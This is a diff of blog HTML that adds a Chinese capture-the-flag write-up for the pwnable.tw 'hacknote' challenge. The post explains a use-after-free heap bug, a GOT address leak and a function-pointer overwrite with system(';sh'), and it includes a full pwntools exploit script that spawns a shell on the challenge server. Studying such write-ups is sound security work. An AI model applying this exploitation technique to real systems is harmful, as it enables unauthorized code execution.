@@ -61,6 +61,60 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-pwnable-tw-hacknote" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/08/pwnable-tw-hacknote/" class="article-date">
+  <time datetime="2018-03-08T07:52:14.000Z" itemprop="datePublished">2018-03-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/08/pwnable-tw-hacknote/">pwnable.tw--hacknote</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><h2 id="1-基本逻辑"><a href="#1-基本逻辑" class="headerlink" title="1)基本逻辑"></a>1)基本逻辑</h2><p>这又是一道malloc相关的内存题目，但是不是老套路。三个函数：add_note，delete_note和print_note。</p>
+<p>使用add_note分配的地址用一个堆表（自己起的名字）存放，（其实就是一个存放地址的数组）。通过add_note可以看出分配的每个块是什么结构：</p>
+<p><img src="/2018/03/08/pwnable-tw-hacknote/addnote.png" alt="add_note"></p>
+<p>首先在ptr[i]中存放一个8字节大小的block（实际malloc分配了16字节）地址；然后这个地址中（称为note块）前4个字节是一个函数地址，即输出地址+4中的内容：</p>
+<p><img src="/2018/03/08/pwnable-tw-hacknote/puts.png" alt="函数内容"></p>
+<p>另外四个字节存放一个新分配的content块的地址，大小size由用户进行输入。对于一个初始状态的地址空间，add_note后的结构如下：</p>
+<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">      ____________________________________</span><br><span class="line">                  |            puts函数地址             |</span><br><span class="line">	———————————————————————————————————</span><br><span class="line">       ————————|            content地址             |</span><br><span class="line">       |   	————————————————————————————————————</span><br><span class="line">|		 </span><br><span class="line">|		 </span><br><span class="line">          |        ——————————————————————————————————————</span><br><span class="line">          |       |          content block              |</span><br><span class="line">          | ——————|       header（8）+ 内容（） 		|</span><br><span class="line">		   ——————————————————————————————————————</span><br></pre></td></tr></table></figure>
+<hr>
+<p>delete_note就是先释放content地址这块空间，再释放malloc（8）这块空间。</p>
+<p>print_note就是调用note块的第一个字段即puts函数</p>
+<h2 id="2-漏洞"><a href="#2-漏洞" class="headerlink" title="2)漏洞"></a>2)漏洞</h2><p>deltenote将note和content释放之后并没有将ptr[i]置为空，也就是说，虽然指针所指向的内存释放掉了，但实际内容还在，我们仍然能使用，即UAF。</p>
+<h2 id="3）漏洞利用"><a href="#3）漏洞利用" class="headerlink" title="3）漏洞利用"></a>3）漏洞利用</h2><p>本题的关键点是，当某一次申请的content大小也为8时，将有机会分配到之前释放过的note块。这样通过向content中写入内容相当于修改note块。由此达到目的。 </p>
+<p><strong>system函数地址泄露</strong>：print_note的打印功能可以帮助泄露地址。例如，先add note0，大小为128，再add note1，大小为128。delete note1，note0.此时再申请add note2，大小为8. 那么note2的note块就是note0块，note2的content块就是note1块（fastbin的原则是LIFO）。此时向content2中写入puts函数地址（保持不变，还是原来的）和free@got地址，这样在调用 print note2时，就会将free函数的实际地址泄露，再根据偏移泄露system函数地址。</p>
+<p><strong>system函数调用</strong>：同理，这个操作与地址泄露相似，delete note2，add note3，也是要求content大小为8，这次将puts函数地址位置覆写成泄露的system函数地址和将要执行的指令。 </p>
+<p>这里涉及一个知识点：Linux连续执行多条命令<a href="http://blog.csdn.net/freedom2028/article/details/7104131" target="_blank" rel="noopener">http://blog.csdn.net/freedom2028/article/details/7104131</a> 仔细看print_note，最终调用函数时，参数也是同一个地址：</p>
+<p><img src="/2018/03/08/pwnable-tw-hacknote/printnote.png" alt="print_note"></p>
+<p> 即，如果将puts函数地址覆盖为system地址，system的参数是system函数地址本身，这样肯定不行。但是使用连续执行多条命令的’ ; ‘，第一条执行错误会被忽略，然后执行下一条，因此可以将content位置覆盖成 ‘;sh\0’.</p>
+<h2 id="4）exp"><a href="#4）exp" class="headerlink" title="4）exp"></a>4）exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Note size :'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Content :'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span> </span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./hacknote'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10102</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">add_note(<span class="number">128</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add_note(<span class="number">128</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804862b</span>)+p32(<span class="number">0x804A018</span>)</span><br><span class="line">add_note(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">print_note(<span class="number">1</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_addr:%x"</span> %free_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system_addr = free_addr + offset</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">payload = p32(system_addr) + <span class="string">';sh\0'</span></span><br><span class="line">add_note(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">print_note(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"offset:%x,system_addr: %x"</span> %(offset,system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/03/08/pwnable-tw-hacknote/" data-id="cjei894d800021ou6811gp8s0" class="article-share-link">Teilen</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-HITCTF-PWN" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/02/07/HITCTF-PWN/" class="article-date">
@@ -173,7 +227,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/02/07/HITCTF-PWN/" data-id="cjdeoq9mx0000q0u6pr672ku8" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2018/02/07/HITCTF-PWN/" data-id="cjei894bn00011ou6809b39tj" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -218,7 +272,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/02/07/hello-world/" data-id="cjdeoq9o70001q0u66ewyqlzv" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2018/02/07/hello-world/" data-id="cjei894b300001ou6bz7ypwth" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -246,7 +300,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archiv</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
     </div>
   </div>
 
@@ -257,6 +311,10 @@
     <h3 class="widget-title">letzter Beitrag</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2018/03/08/pwnable-tw-hacknote/">pwnable.tw--hacknote</a>
+          </li>
         
           <li>
             <a href="/2018/02/07/HITCTF-PWN/">HITCTF PWN</a>
